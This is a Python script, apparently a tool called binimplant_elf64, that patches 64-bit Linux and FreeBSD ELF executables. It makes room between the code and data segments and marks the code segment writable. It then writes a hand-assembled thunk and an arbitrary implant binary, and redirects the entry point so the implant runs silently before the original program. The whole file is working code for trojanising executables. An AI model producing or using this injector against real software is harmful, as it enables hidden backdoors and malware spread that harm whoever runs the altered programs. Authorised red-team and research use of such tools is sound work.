#!/usr/bin/env python
#
# quick start: ./binimplant_elf64.py linux implant.bin ./target.elf

import re
import sys
import struct
import random
import binascii

NEW_ALIGN = 0x1000 # 4k page

def verifyElf64(fp):
    assert fp.read(4) == "\x7fELF" # e_ident[0..4)
    assert fp.read(1) == "\x02" # e_ident[EI_CLASS] should be 64-bit
    assert fp.read(1) == "\x01" # e_ident[EI_DATA] should be little-end
    assert fp.read(1) == "\x01" # e_ident[EI_VERSION] should be version 1
    fp.read(1+1+7) # EI_OSABI, EI_ABIVERSION, EI_PAD

def readScnHdr(fp, strtab, index=None):
    oHdr = fp.tell()

    keys = ['name', 'type', 'flags', 'addr', 'offset', 'size', 'link', \
        'info', 'addralign', 'entsize']
    values = list(struct.unpack('IIQQQQIIQQ', fp.read(4+4+8+8+8+8+4+4+8+8)))

    # convenience: add resolved string
    keys.append('nameStr')
    o = values[0] # name is offset into strtab
    values.append(strtab[o:o+strtab[o:].find('\x00')])

    keys.append('oHdr') # oHdr value
    values.append(oHdr)

    if index:
        keys.append('index')
        values.append(index)

    return dict(zip(keys, values))

def writeScnHdr(hdr):
    tmp = fp.tell()
    values = (hdr['name'], hdr['type'], hdr['flags'], hdr['addr'], \
        hdr['offset'], hdr['size'], hdr['link'], hdr['info'], \
        hdr['addralign'], hdr['entsize'])
    fp.seek(hdr['oHdr'])
    fp.write(struct.pack('IIQQQQIIQQ', *values))
    fp.seek(tmp)

def readSegHdr(fp):
    oHdr = fp.tell()
    keys = ['type', 'flags', 'offset', 'vaddr', 'paddr', 'filesz', \
        'memsz', 'align', 'oHdr']
    values = list(struct.unpack('IIQQQQQQ', fp.read(0x38)))
    values.append(oHdr) # oHdr value
    return dict(zip(keys, values))

def writeSegHdr(hdr):
    tmp = fp.tell()
    values = (hdr['type'], hdr['flags'], hdr['offset'], hdr['vaddr'], \
        hdr['paddr'], hdr['filesz'], hdr['memsz'], hdr['align'])
    fp.seek(hdr['oHdr'])
    fp.write(struct.pack('IIQQQQQQ', *values))
    fp.seek(tmp)

(shdrText,shdrData,shdrRodata)=(None,None,None)
(scnSymtab,scnStrtab,scnShstrtab)=(None,None,None)
(e_shnum,e_shoff,e_phoff,e_phnum,e_entry,e_shstrndx)=(None,None,None,None,None,None)

def calcGlobals(fp):
    global shdrText, shdrData, shdrRodata
    global scnSymtab, scnStrtab, scnShstrtab
    global e_shnum, e_shoff, e_phoff, e_phnum, e_entry, e_shstrndx

    # read elf64_hdr
    fp.seek(16)
    (x,x,x,e_entry,e_phoff,e_shoff,x,x,x,e_phnum,x,e_shnum,e_shstrndx) = \
        struct.unpack('HHIQQQIHHHHHH', fp.read(2+2+4+8+8+8+4+2+2+2+2+2+2))

    # read section string table (probable name: .shstrtab)
    fp.seek(e_shoff + e_shstrndx*0x40 + 24)
    (sh_offset,sh_size) = struct.unpack('QQ', fp.read(16))
    fp.seek(sh_offset)
    scnShstrtab = fp.read(sh_size)

    shdrText = None
    shdrData = None
    shdrRodata = None
    scnSymtab = None
    scnStrtab = None
    for scn_idx in range(e_shnum):
        fp.seek(e_shoff+scn_idx*0x40)
        tmp = readScnHdr(fp, scnShstrtab, scn_idx)
        if tmp['nameStr'] == '.text': shdrText = tmp
        if tmp['nameStr'] == '.data': shdrData = tmp
        if tmp['nameStr'] == '.rodata': shdrRodata = tmp
        if tmp['nameStr'] == '.symtab': 
            fp.seek(tmp['offset'])
            scnSymtab = fp.read(tmp['size'])
        if tmp['nameStr'] == '.strtab': 
            fp.seek(tmp['offset'])
            scnStrtab = fp.read(tmp['size'])


###############################################################################
# "main"
###############################################################################
if len(sys.argv) <= 3:
    print('usage: %s <os> <implant_file> <elf_file>' % sys.argv[0])
    sys.exit(-1);

os = sys.argv[1]
assert os in ['linux','freebsd']

implant = ''
with open(sys.argv[2], 'rb') as fp:
    implant = fp.read()

fp = open(sys.argv[3], 'rb+')
verifyElf64(fp)
calcGlobals(fp)

# find code and data segment, calculate where implant will live
(cSegHdr,dSegHdr)=(None,None)
(oCodeSegHdr,oDataSegHdr)=(None,None)

crankedOpen = False
originalTextSize = None
while 1:
    nPtLoad = 0
    fp.seek(e_phoff)

    for i in range(e_phnum):
        hdr = readSegHdr(fp)
        if hdr['type']==1:
            nPtLoad += 1
        if hdr['type']==1 and hdr['flags']==5:
            oCodeSegHdr = fp.tell()-0x38
            cSegHdr = hdr
        elif hdr['type']==1 and hdr['flags']==6:
            oDataSegHdr = fp.tell()-0x38
            dSegHdr = hdr
    assert(nPtLoad == 2)
    assert(cSegHdr and dSegHdr)
    assert(cSegHdr['offset']<dSegHdr['offset'])
    assert(cSegHdr['vaddr']<dSegHdr['vaddr'])
    
    (flocC,mlocC,fszC,mszC) = \
        (cSegHdr['offset'],cSegHdr['vaddr'],cSegHdr['filesz'],cSegHdr['memsz'])
    print("code segment:")
    print(" file [%08X,%08X) (0x%X bytes)" % (flocC, flocC+fszC, fszC))
    print("  mem [%08X,%08X) (0x%X bytes)" % (mlocC, mlocC+mszC, mszC))
    (flocD,mlocD,fszD,mszD) = \
        (dSegHdr['offset'],dSegHdr['vaddr'],dSegHdr['filesz'],dSegHdr['memsz'])
    print("data segment:")
    print(" file [%08X,%08X) (0x%X bytes)" % (flocD, flocD+fszD, fszD))
    print("  mem [%08X,%08X) (0x%X bytes)" % (mlocD, mlocD+mszD, mszD))
    (flocText,mlocText,szText) = (shdrText['offset'], shdrText['addr'], shdrText['size'])
    print("text section:")
    print(" file [%08X,%08X) (0x%X bytes)" % (flocText, flocText+szText, szText))
    print("  mem [%08X,%08X) (0x%X bytes)" % (mlocText, mlocText+szText, szText))
    nGapFile = flocD - (flocC + fszC)
    nGapMem = mlocD - (mlocC + mszC)
    print("code/data gap:")
    print(" file gap [0x%08X,0x%08X) (0x%X bytes)" % (flocC+fszC,flocD,nGapFile))
    print("  mem gap [0x%08X,0x%08X) (0x%X bytes)" % (mlocC+mszC,mlocD,nGapMem))

    if nGapFile < 9999999 and not crankedOpen:
        # expand it!
        cut = dSegHdr['offset']
        assert(e_phoff + e_phnum*0x38 < cut)
        dSegHdr['offset'] += NEW_ALIGN
        fp.seek(cut)
        tmp = fp.read()
        fp.seek(cut)
        fp.write('\x00'*NEW_ALIGN)
        fp.write(tmp)
        # adjust elf header
        if(e_shoff > cut):
            (old,new) = (e_shoff, e_shoff+NEW_ALIGN)
            print("elf header,  section header offset 0x%X->0x%X" % (old,new))
            fp.seek(0x28)
            fp.write(struct.pack('<q', new))
            e_shoff = new
        # adjust program headers
        fp.seek(e_phoff)
        for i in range(e_phnum):
            hdr = readSegHdr(fp)
            (old,new) = (hdr['offset'],hdr['offset']+NEW_ALIGN)
            if old < cut: continue
            if hdr['align'] > NEW_ALIGN:
                print("segment %d/%d adj align 0x%X->0x%X" % \
                    (i+1, e_phnum, hdr['align'], NEW_ALIGN))
                hdr['align'] = NEW_ALIGN
            print("segment %d/%d move offset 0x%X->0x%X" % (i+1,e_phnum,old,new))
            hdr['offset'] = new
            writeSegHdr(hdr)
        # adjust section headers
        fp.seek(e_shoff)
        for i in range(e_shnum):
            hdr = readScnHdr(fp, scnShstrtab)
            (old,new) = (hdr['offset'],hdr['offset']+NEW_ALIGN)
            if old < cut: continue
            print("section %s move offset 0x%X->0x%X" % (hdr['nameStr'],old,new))
            hdr['offset'] = new
            writeScnHdr(hdr)
        # adjustments made, re-orient ourselves!
        print('--------------------------------')
        print('EXPANSION STEP COMPLETE!')
        print('--------------------------------')
        crankedOpen = True
        continue

    # break out    
    break

# if adjustments were made, recalculate the globals
calcGlobals(fp)

oEntryOld = cSegHdr['offset'] + (e_entry - cSegHdr['vaddr'])    
oEntryNew = cSegHdr['offset'] + cSegHdr['filesz']
vaEntryNew = cSegHdr['vaddr'] + cSegHdr['filesz']
print("(FILE) entrypoint old:%08X new:%08X" % (oEntryOld, oEntryNew))
print(" (MEM) entrypoint old:%08X new:%08X" % (e_entry, vaEntryNew))

assert(shdrText and shdrData and shdrRodata)

print("expanding code segment, marking writeable")
cSegHdr['flags'] |= 2 #
cSegHdr['filesz'] += len(implant) # p_filesz
cSegHdr['memsz'] += len(implant) # p_memsz
fp.seek(oCodeSegHdr)
writeSegHdr(cSegHdr)
print("writing implant thunk")
fp.seek(oEntryNew)
fp.write('\x57')                    # push rdi
fp.write('\x56')                    # push rsi
fp.write('\x52')                    # push rdx
fp.write('\x51')                    # push rcx
fp.write('\x41\x50')                # push r8
fp.write('\x41\x51')                # push r9
# on linux, loader gives _start() argc, argv from stack
if os == 'linux':
    fp.write('\x48\x8b\x44\x24\x30') # mov rax, [rsp+48] (scc's arg0)
    fp.write('\x48\x8d\x54\x24\x38') # lea rdx, [rsp+56] (scc's arg1)
# on freebsd, loader gives _start() argc, argv from arg0 (rdi) pointer
elif os == 'freebsd':
    fp.write('\x48\x8b\x07\x90\x90') # mov rax, qword ptr [rdi]
    fp.write('\x48\x8d\x57\x08\x90') # lea rdx, [rdi+8]
else:
    raise Exception('dunno os: '+os)
#fp.write('\xCC')
fp.write('\xe8\x0D\x00\x00\x00')     # call <cur_addr>+13
fp.write('\x41\x59')                 # pop r9
fp.write('\x41\x58')                 # pop r8
fp.write('\x59')                     # pop rcx
fp.write('\x5a')                     # pop rdx
fp.write('\x5e')                     # pop rsi
fp.write('\x5f')                     # pop rdi
fp.write('\xe9' + struct.pack('<i', oEntryOld - (oEntryNew+36))) # jmp to OEP
print("writing implant")
fp.write(implant)
print("writing new entrypoint: %08X" % vaEntryNew)
fp.seek(0x18)
fp.write(struct.pack('<q', vaEntryNew))

fp.close()